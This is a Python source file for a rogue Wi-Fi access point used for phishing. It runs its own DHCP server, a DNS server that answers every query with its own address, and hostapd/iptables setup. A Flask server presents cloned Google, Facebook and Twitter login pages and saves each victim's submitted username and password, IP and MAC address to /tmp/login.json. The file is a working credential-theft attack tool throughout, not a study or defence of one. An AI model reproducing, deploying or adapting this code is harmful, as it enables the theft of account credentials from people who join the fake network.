import os
import threading
from flask import Flask, request, render_template, redirect, url_for
import json
import re
import network
from multiprocessing import Process
import datetime
import socket
import struct
import IN
from collections import defaultdict
import time
from execute import execute


class DNSQuery:
    '''
        @brief
        @see  rfc 1035
    '''
    def __init__(self, data):
        self.data = data
        self.dominio = ''
        # Copy Opcode to variable 'tipo'.
        tipo = (ord(data[2]) >> 3) & 15
        if tipo == 0: # Opcode 0 mean a standard query(QUERY)
            '''
            data[12] is Question-field.
                ex) 6'google'3'com'00
            '''
            ini = 12
            lon = ord(data[ini])
            while lon != 0:
                self.dominio += data[ini + 1:ini + lon + 1] + '.'
                ini += lon + 1
                lon = ord(data[ini])

    def respuesta(self, ip):
        packet = ''
        if self.dominio:
            packet += self.data[:2] + "\x81\x80"                            # Response & No error.
            packet += self.data[4:6] + self.data[4:6] + '\x00\x00\x00\x00'  # Questions and Answers Counts.
            packet += self.data[12:]                                        # Original Domain Name Question.
            packet += '\xc0\x0c'                                            # A domain name to which this resource record pertains.
            packet += '\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'            # type, class, ttl, data-length
            packet += str.join('', map(lambda x: chr(int(x)), ip.split('.')))
        return packet


class DNSServer(object):
    def __init__(self, iface, address):
        self.iface = iface
        self.START_SIGNAL = True
        self.address = address
        self.connect_user = dict()

    def run(self):
        dns_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        dns_sock.settimeout(3)  # Set timeout on socket-operations.
        execute('fuser -k -n udp 53')
        time.sleep(0.5)
        dns_sock.bind(('', 53))
        while self.START_SIGNAL:
            try:
                data, addr = dns_sock.recvfrom(1024)
            except:
                continue
            packet = DNSQuery(data)
            # Return own IP adress.
            dns_sock.sendto(packet.respuesta(self.address), addr)
        dns_sock.close()

    def stop(self):
        self.START_SIGNAL = False


class OutOfLeasesError(Exception):
    pass


class DHCPServer:
    '''
        This class implements a DHCP Server, limited to PXE options.
        Implemented from RFC2131, RFC2132,
        https://en.wikipedia.org/wiki/Dynamic_Host_Configuration_Protocol,
        and http://www.pix.net/software/pxeboot/archive/pxespec.pdf.
    '''
    def __init__(self, iface):
        # If SO_BINDTODEVICE is present, it is possible for dhcpd to operate on Linux with more than one network interface.
        # man 7 socket
        if not hasattr(IN, "SO_BINDTODEVICE"):
            IN.SO_BINDTODEVICE = 25
        self.iface = iface
        self.START_SIGNAL = True
        import network
        if network.get_ip_address(self.iface):
            self.ip = network.get_ip_address(self.iface)
        else:
            self.ip = '192.168.103.1'
        self.port = 67
        self.elements_in_address = self.ip.split('.')
        # IP pool x.x.x.100 ~ x.x.x.150
        self.offer_from = '.'.join(self.elements_in_address[0:3]) + '.100'
        self.offer_to = '.'.join(self.elements_in_address[0:3]) + '.150'
        self.subnet_mask = '255.255.255.0'
        self.router = self.ip
        self.dns_server = self.ip
        self.broadcast = '<broadcast>'
        self.file_server = self.ip
        self.file_name = '' # ??
        if not self.file_name:
            self.force_file_name = False
            self.file_name = 'pxelinux.0'
        else:
            self.force_file_name = True
        self.ipxe = False
        self.http = False
        self.mode_proxy = False
        self.static_config = dict()
        self.whitelist = False
        self.mode_debug = False
        # The value of the magic-cookie is the 4 octet dotted decimal 99.130.83.99
        #   (or hexadecimal number 63.82.53.63) in network byte order.
        #   (this is the same magic cookie as is defined in RFC 1497 [17])
        # In module struct '!' mean Big-endian
        #   'I' mean unsigned int
        self.magic = struct.pack('!I', 0x63825363) # magic cookie.

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.setsockopt(socket.SOL_SOCKET, IN.SO_BINDTODEVICE, self.iface + '\0')
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        self.sock.bind(('', self.port))

        # Specific key is MAC
        self.leases = defaultdict(lambda: {'ip': '', 'expire': 0, 'ipxe': self.ipxe})
        self.connect_user = dict()
        self.connect_data = ''


    def get_namespaced_static(self, path, fallback = {}):
        statics = self.static_config
        for child in path.split('.'):
            statics = statics.get(child, {})
        return statics if statics else fallback

    def next_ip(self):
        '''
            This method returns the next unleased IP from range;
            also does lease expiry by overwrite.
        '''

        # if we use ints, we don't have to deal with octet overflow
        # or nested loops (up to 3 with 10/8); convert both to 32-bit integers

        # e.g '192.168.1.1' to 3232235777
        encode = lambda x: struct.unpack('!I', socket.inet_aton(x))[0]

        # e.g 3232235777 to '192.168.1.1'
        decode = lambda x: socket.inet_ntoa(struct.pack('!I', x))

        from_host = encode(self.offer_from)
        to_host = encode(self.offer_to)

        # pull out already leased IPs
        leased = [self.leases[i]['ip'] for i in self.leases
                if self.leases[i]['expire'] > time.time()]

        # convert to 32-bit int
        leased = map(encode, leased)

        # loop through, make sure not already leased and not in form X.Y.Z.0
        for offset in xrange(to_host - from_host):
            if (from_host + offset) % 256 and from_host + offset not in leased:
                return decode(from_host + offset)
        raise OutOfLeasesError('Ran out of IP addresses to lease!')

    def tlv_encode(self, tag, value):
        '''Encode a TLV option.'''
        return struct.pack('BB', tag, len(value)) + value

    def tlv_parse(self, raw):
        '''Parse a string of TLV-encoded options.'''
        ret = {}
        while(raw):
            [tag] = struct.unpack('B', raw[0])
            if tag == 0: # padding
                raw = raw[1:]
                continue
            if tag == 255: # end marker
                break
            [length] = struct.unpack('B', raw[1])
            value = raw[2:2 + length]
            raw = raw[2 + length:]
            if tag in ret:
                ret[tag].append(value)
            else:
                ret[tag] = [value]
        return ret

    def get_mac(self, mac):
        '''
            This method converts the MAC Address from binary to
            human-readable format for logging.
        '''
        return ':'.join(map(lambda x: hex(x)[2:].zfill(2), struct.unpack('BBBBBB', mac))).upper()

    def craft_header(self, message):
        '''This method crafts the DHCP header using parts of the message.'''
        xid, flags, yiaddr, giaddr, chaddr = struct.unpack('!4x4s2x2s4x4s4x4s16s', message[:44])
        client_mac = chaddr[:6]

        # op, htype, hlen, hops, xid
        response =  struct.pack('!BBBB4s', 2, 1, 6, 0, xid)
        if not self.mode_proxy:
            response += struct.pack('!HHI', 0, 0, 0) # secs, flags, ciaddr
        else:
            response += struct.pack('!HHI', 0, 0x8000, 0)
        if not self.mode_proxy:
            if self.leases[client_mac]['ip']: # OFFER
                offer = self.leases[client_mac]['ip']
            else: # ACK
                offer = self.get_namespaced_static('dhcp.binding.{0}.ipaddr'.format(self.get_mac(client_mac)))
                offer = offer if offer else self.next_ip()
                self.leases[client_mac]['ip'] = offer
                self.leases[client_mac]['expire'] = time.time() + 86400
            response += socket.inet_aton(offer) # yiaddr
        else:
            response += socket.inet_aton('0.0.0.0')
        response += socket.inet_aton(self.file_server) # siaddr
        response += socket.inet_aton('0.0.0.0') # giaddr
        response += chaddr # chaddr

        # BOOTP legacy pad
        response += chr(0) * 64 # server name
        if self.mode_proxy:
            response += self.file_name
            response += chr(0) * (128 - len(self.file_name))
        else:
            response += chr(0) * 128
        response += self.magic # magic section
        return (client_mac, response)

    def craft_options(self, opt53, client_mac):
        '''
            @brief This method crafts the DHCP option fields
            @param opt53:
            *    2 - DHCPOFFER
            *    5 - DHCPACK
            @see RFC2132 9.6 for details.
        '''
        response = self.tlv_encode(53, chr(opt53)) # message type, OFFER
        response += self.tlv_encode(54, socket.inet_aton(self.ip)) # DHCP Server
        if not self.mode_proxy:
            subnet_mask = self.get_namespaced_static('dhcp.binding.{0}.subnet'.format(self.get_mac(client_mac)), self.subnet_mask)
            response += self.tlv_encode(1, socket.inet_aton(subnet_mask)) # subnet mask
            router = self.get_namespaced_static('dhcp.binding.{0}.router'.format(self.get_mac(client_mac)), self.router)
            response += self.tlv_encode(3, socket.inet_aton(router)) # router
            dns_server = self.get_namespaced_static('dhcp.binding.{0}.dns'.format(self.get_mac(client_mac)), [self.dns_server])
            dns_server = ''.join([socket.inet_aton(i) for i in dns_server])
            response += self.tlv_encode(6, dns_server)
            response += self.tlv_encode(51, struct.pack('!I', 86400)) # lease time

        # TFTP Server OR HTTP Server; if iPXE, need both
        response += self.tlv_encode(66, self.file_server)

        # file_name null terminated
        if not self.ipxe or not self.leases[client_mac]['ipxe']:
            # http://www.syslinux.org/wiki/index.php/PXELINUX#UEFI
            if 93 in self.leases[client_mac]['options'] and not self.force_file_name:
                [arch] = struct.unpack("!H", self.leases[client_mac]['options'][93][0])
                if arch == 0: # BIOS/default
                    response += self.tlv_encode(67, 'pxelinux.0' + chr(0))
                elif arch == 6: # EFI IA32
                    response += self.tlv_encode(67, 'syslinux.efi32' + chr(0))
                elif arch == 7: # EFI BC, x86-64 (according to the above link)
                    response += self.tlv_encode(67, 'syslinux.efi64' + chr(0))
                elif arch == 9: # EFI x86-64
                    response += self.tlv_encode(67, 'syslinux.efi64' + chr(0))
            else:
                response += self.tlv_encode(67, self.file_name + chr(0))
        else:
            response += self.tlv_encode(67, 'chainload.kpxe' + chr(0)) # chainload iPXE
            if opt53 == 5: # ACK
                self.leases[client_mac]['ipxe'] = False
        if self.mode_proxy:
            response += self.tlv_encode(60, 'PXEClient')
            response += struct.pack('!BBBBBBB4sB', 43, 10, 6, 1, 0b1000, 10, 4, chr(0) + 'PXE', 0xff)
        response += '\xff'
        return response

    def dhcp_offer(self, message):
        '''This method responds to DHCP discovery with offer.'''
        client_mac, header_response = self.craft_header(message)
        options_response = self.craft_options(2, client_mac) # DHCPOFFER
        response = header_response + options_response
        self.sock.sendto(response, (self.broadcast, 68))

    def dhcp_ack(self, message):
        '''This method responds to DHCP request with acknowledge.'''
        client_mac, header_response = self.craft_header(message)
        options_response = self.craft_options(5, client_mac) # DHCPACK
        response = header_response + options_response
        self.sock.sendto(response, (self.broadcast, 68))

    def validate_req(self):
        return False

    def run(self):
        '''Main listen loop.'''
        while self.START_SIGNAL:
            message, address = self.sock.recvfrom(1024)
            # 28 bytes of padding
            # 6 bytes MAC to string.
            [client_mac] = struct.unpack('!28x6s', message[:34])                # Get MAC address
            self.leases[client_mac]['options'] = self.tlv_parse(message[240:])
            type = ord(self.leases[client_mac]['options'][53][0])               # see RFC2131, page 10
            # 1 = DHCP Discover message (DHCPDiscover).
            # 2 = DHCP Offer message (DHCPOffer).
            # 3 = DHCP Request message (DHCPRequest).
            # 4 = DHCP Decline message (DHCPDecline).
            # 5 = DHCP Acknowledgment message (DHCPAck).
            # 6 = DHCP Negative Acknowledgment message (DHCPNak).
            # 7 = DHCP Release message (DHCPRelease).
            # 8 = DHCP Informational message (DHCPInform).
            if type == 1:
                try:
                    self.dhcp_offer(message)
                    self.connect_user.update({
                        'connected': self.leases[client_mac]['ip'],
                        'host_name': self.leases[client_mac]['options'][12][0],
                        'mac_addr': self.get_mac([client_mac][0]),
                        'Time': datetime.datetime.fromtimestamp(time.time()).strftime('%Y-%m-%d %H:%M:%S')
                    })
                    self.connect_data = self.connect_data.replace('[', '')
                    self.connect_data = self.connect_data.replace(']', '')
                    self.connect_data = '[' + self.connect_data + str(self.connect_user) + ', ]'
                    with open('/tmp/connect.json', 'w+') as con_log_file:
                        json.dump(self.connect_data, con_log_file, ensure_ascii=False)
                        con_log_file.close()
                except OutOfLeasesError:
                    pass
            elif type == 3 and address[0] == '0.0.0.0' and not self.mode_proxy:
                self.dhcp_ack(message)
            elif type == 3 and address[0] != '0.0.0.0' and self.mode_proxy:
                self.dhcp_ack(message)

    def stop(self):
        self.START_SIGNAL = False


class WEBServer(object):
    def __init__(self, iface, address):
        self.address = address
        self.app = Flask(__name__,
                         template_folder=os.path.join(os.path.dirname(os.path.abspath(__file__)), 'phishing/templates'),
                         static_folder=os.path.join(os.path.dirname(os.path.abspath(__file__)), 'phishing/static'))
        #self.sslify = SSLify(self.app)
        self.iface = iface
        self.logged_user = dict()
        self.logged_data = ''

    def run(self):
        try:
            os.remove('/tmp/login.json')
        except OSError:
            pass
        try:
            os.remove('/tmp/connect.json')
        except OSError:
            pass
        self.app.add_url_rule('/', 'index', self.index)
        self.app.add_url_rule('/login', 'login', self.login, methods=['POST'])
        self.app.add_url_rule('/shutdown', 'stop', self.stop)
        self.app.run(self.address, port=80, debug=False, threaded=True)

    def index(self):
        url = self.split_url(request.url)
        if re.search('[a-zA-Z0-9_].google.[a-zA-Z0-9_]', url['domain']):
            return render_template('google/index.html'), 200
        elif re.search('[a-zA-Z0-9_].facebook.[a-zA-Z0-9_]', url['domain']):
            return render_template('facebook/index.html'), 200
        elif re.search('[a-zA-Z0-9_].twitter.[a-zA-Z0-9_]', url['domain']):
            return render_template('twitter/index.html'), 200
        else:
            return render_template('google/index.html'), 200

    def login(self):
        self.logged_user.update({
            'ip_addr': request.remote_addr,
            'site': self.split_url(request.url)['domain'],
            'mac_addr': network.get_remote_mac(self.iface, request.remote_addr),
            'id': request.form['id'],
            'pw': request.form['password'],
            'Time': datetime.datetime.fromtimestamp(time.time()).strftime('%Y-%m-%d %H:%M:%S')
        })
        self.logged_data = self.logged_data.replace('[', '')
        self.logged_data = self.logged_data.replace(']', '')
        self.logged_data = '[' + self.logged_data + str(self.logged_user) + ', ]'
        with open('/tmp/login.json', 'w+') as log_file:
            json.dump(self.logged_data, log_file, ensure_ascii=False)
            log_file.close()
        return redirect(url_for('index'))

    @staticmethod
    def split_url(url):
        url = url.split('/', 3)
        return {'domain': url[2], 'path': url[3]}

    def shutdown_server(self):
        func = request.environ.get('werkzeug.server.shutdown')
        if func is None:
            raise RuntimeError('Not running with the Werkzeug Server')
        func()

    def stop(self):
        self.shutdown_server()
        return 'Server Shutdown'


class APCreate(object):
    def __init__(self, iface, enc, ssid, password):
        self.wlan = iface
        self.ppp = 'eth0'
        self.enc = str(enc).upper()
        import network
        # Get my IP address and create thread for DHCPServer, DNSServer, WEBServer.
        if network.get_ip_address(self.wlan):
            self.address = network.get_ip_address(self.wlan)
        else:
            # If self.address is missing then Set static IP address.
            self.address = '192.168.103.1'
        self.netmask = '255.255.255.0'
        self.ssid = ssid
        self.password = password
        self.dhcp = DHCPServer(self.wlan)
        self.dhcp_thread = threading.Thread(target=self.dhcp.run)
        self.dns_server = DNSServer(self.wlan, self.address)
        self.dns_thread = threading.Thread(target=self.dns_server.run)
        self.web_server = WEBServer(self.wlan, self.address)
        self.web_process = Process(target=self.web_server.run)
        self.isRunning = False

    def config(self):
        ''' Make config file for hostapd. '''
        conf_file = os.path.join(os.path.dirname(os.path.abspath(__file__))) + '/conf/run.conf'
        conf = open(conf_file, 'w')
        data = 'interface=' + self.wlan + '\n' + \
               'driver=nl80211\n' + \
               'ssid=' + self.ssid + '\n' + \
               'channel=11\n'
        if self.enc == 'WPA':
            # When encryption mode is WPA, add WPA specific data.
            enc = 'auth_algs=1\nignore_broadcast_ssid=0\nwpa=3\n' + \
                  'wpa_passphrase=' + self.password + '\n' + \
                  "wpa_key_mgmt=WPA-PSK\nwpa_pairwise=TKIP\nrsn_pairwise=CCMP"
            data += enc
        elif self.enc == 'WEP':
            # When encryption mode is WEP, add WEP specific data.
            enc = 'auth_algs=3\nwep_default_key=0\n' + \
                  'wep_key0=' + self.password
            data += enc
        conf.write(data)
        conf.close()

    def run(self):
        self.config()
        # Clean
        self.stop()
        execute('rfkill unblock wlan')
        time.sleep(1)
        if_up_cmd = 'ifconfig ' + self.wlan + ' up ' + self.address + ' netmask ' + self.netmask
        execute(if_up_cmd)
        time.sleep(1)
        execute('killall hostapd')
        # Set IP table rules as packet-forwardable.
        execute('sysctl -w net.ipv4.ip_forward=1')
        execute('iptables -X')
        execute('iptables -F')
        execute('iptables -t nat -F')
        execute('iptables -t nat -X')
        execute('iptables -t nat -A POSTROUTING -o ' + self.ppp + ' -j MASQUERADE')
        execute('iptables -A OUTPUT --out-interface ' + self.wlan + ' -j ACCEPT')
        execute('iptables -A INPUT --in-interface ' + self.wlan + ' -j ACCEPT')
        # Run hostapd. Hostapd daemon supports make PC to AP.
        execute('hostapd -B ' + os.path.join(os.path.dirname(os.path.abspath(__file__))) + '/conf/run.conf')
        time.sleep(2)
        self.dns_thread.start()
        self.dhcp_thread.start()
        time.sleep(2)
        self.web_process.start()
        self.isRunning = True

    def stop(self):
        print "[*] FAKE_AP RECEIVED STOP SIGNAL"
        if self.isRunning:
            try:
                self.dhcp.stop()
                self.dns_server.stop()
                self.web_process.terminate()
            except:
                pass
            execute('iptables -P FORWARD DROP')
            if self.wlan:
                execute('iptables -D OUTPUT --out-interface ' + self.wlan + ' -j ACCEPT')
                execute('iptables -D INPUT --in-interface ' + self.wlan + ' -j ACCEPT')
            execute('iptables --table nat --delete-chain')
            execute('iptables --table nat -F')
            execute('iptables --table nat -X')
            execute('sysctl -w net.ipv4.ip_forward=0')
            execute('killall hostapd')                  # Consider using it's pid.
            execute('ifconfig ' + self.wlan + ' down')
        self.isRunning = False

    @staticmethod
    def get_values_login():
        '''
            Returns the collected user login information.
        '''
        try:
            get_values = json.dumps(open('/tmp/login.json', 'r').read())
            return get_values
        except IOError:
            return json.dumps([{}])

    @staticmethod
    def get_values_connect():
        '''
            Returns the collected device information.
        '''
        try:
            get_values = json.dumps(open('/tmp/connect.json', 'r').read())
            return get_values
        except IOError:
            return json.dumps([{}])
